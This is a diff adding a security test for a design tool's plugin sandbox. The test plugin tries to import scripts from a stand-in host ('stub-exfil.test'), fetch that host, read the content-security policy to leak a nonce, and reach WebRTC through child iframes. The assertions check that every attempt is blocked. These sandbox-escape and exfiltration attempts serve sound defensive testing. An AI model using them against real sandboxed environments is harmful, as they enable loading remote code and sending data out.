@@ -103,6 +103,44 @@ await dt.tool("update_nodes", { updates: [{ id: "${secret}", name: JSON.stringif
   const paintResult = JSON.parse((await doc()).nodes[secret].name);
   check("image paints with //host, https:host or tab-split addresses are refused and a nested frame's script never runs", paintResult.rel === "refused" && paintResult.noslash === "refused" && paintResult.tab === "refused" && paintResult.arrived === 0 && stubHits.length === 0, JSON.stringify({ paintResult, hits: stubHits }));
 
+  // ---- import() and leaked policy text: nothing to read, nothing reaches the stub host
+  const impId = await dt(
+    async ([secret, code]) => (await window.__dt.tool("save_plugin", { name: "Imp", code })).result.id,
+    [secret, `
+    const out = {};
+    for (const u of ["https://stub-exfil.test/m.js", "http://stub-exfil.test/m2.js"]) {
+      try { await import(u); out.imp = "loaded"; } catch (e) { out.imp = "blocked"; }
+    }
+    let pol = "";
+    document.addEventListener("securitypolicyviolation", (e) => { pol = e.originalPolicy; });
+    try { await fetch("https://stub-exfil.test/trigger"); } catch (e) {}
+    await new Promise((r) => setTimeout(r, 200));
+    out.policySeen = pol.length > 0;
+    out.nonceLeak = /nonce-/.test(pol) || !!(document.currentScript && document.currentScript.nonce);
+    let arrived = 0, rtc = "none";
+    window.addEventListener("message", (e) => { if (e.data && e.data.child) { arrived++; rtc = e.data.child; } });
+    const f = document.createElement("iframe");
+    f.srcdoc = "<script>parent.postMessage({ child: typeof RTCPeerConnection }, '*')<\\/script>";
+    document.body.appendChild(f);
+    const g = document.createElement("iframe");
+    document.body.appendChild(g);
+    try { out.blankRealm = typeof g.contentWindow.RTCPeerConnection; } catch (e) { out.blankRealm = "blocked"; }
+    const h = document.createElement("iframe");
+    h.srcdoc = "<p>x</p>";
+    document.body.appendChild(h);
+    try { out.srcdocRealm = typeof h.contentWindow.RTCPeerConnection; } catch (e) { out.srcdocRealm = "blocked"; }
+    await new Promise((r) => setTimeout(r, 1000));
+    out.arrived = arrived;
+    out.rtc = rtc;
+    await dt.tool("update_nodes", { updates: [{ id: "__ID__", name: JSON.stringify(out) }] });`.replaceAll("__ID__", secret)],
+  );
+  await dt((id) => window.__dt.runPlugin(id), impId);
+  await page.waitForFunction(() => window.__dt.plugin() === null, null, { timeout: 8000 });
+  await page.waitForTimeout(500);
+  const impResult = JSON.parse((await doc()).nodes[secret].name);
+  check("plugin import() of a web address is blocked, no nonce leaks, a child frame runs no script", impResult.imp === "blocked" && impResult.nonceLeak === false && impResult.arrived === 0 && stubHits.length === 0, JSON.stringify({ impResult, hits: stubHits }));
+  check("a plugin can't reach a fresh WebRTC through a child frame's window", impResult.blankRealm !== "function" && impResult.srcdocRealm !== "function", `${impResult.blankRealm}/${impResult.srcdocRealm}`);
+
   // ---- a long run, stopped, undoes in one step (g4_plugins)
   const before = Object.keys((await doc()).nodes).length;
   const loopId = await dt(
